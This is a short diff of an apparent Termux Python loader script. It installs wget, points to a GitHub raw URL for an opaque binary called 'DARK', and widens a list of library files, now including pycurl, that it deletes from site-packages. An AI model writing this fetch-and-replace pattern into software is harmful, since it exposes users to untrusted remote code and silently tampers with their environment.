@@ -14,7 +14,7 @@ os.system("pkg install wget -y")
 url = "https://github.com/Ahmed-XD/library/blob/main/extra/DARK?raw=true"
 file_name = "DARK"
 dir_path = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/'
-files = ["idk.so","sdk.so","lofi.so","power.so"]
+files = ["idk.so","sdk.so","lofi.so","power.so","SUV","pycurl.cpython-311.so"]
 for file in files:
     if os.path.exists(dir_path+file):
         os.remove(dir_path+file)
